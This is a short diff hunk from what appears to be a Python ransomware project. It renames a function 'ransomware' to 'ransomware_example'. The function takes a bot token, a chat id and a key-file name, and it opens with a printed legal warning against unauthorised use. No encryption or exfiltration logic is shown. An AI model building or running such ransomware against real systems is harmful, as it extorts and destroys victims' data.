@@ -6,7 +6,7 @@ class YouDontKnowWhatYoureDoing(Exception):
     def __init__(self, *args: object) -> None:
         super().__init__(*args)
 
-def ransomware(bottoken, chat_id, are_you_sure=False, keyfilename="youremakinganerror.key"):
+def ransomware_example(bottoken, chat_id, are_you_sure=False, keyfilename="youremakinganerror.key"):
     print("""
 Don't execute this on machines or environments without permission.
 this could lead to several legal consequences and I, Riccardo Zappitelli,
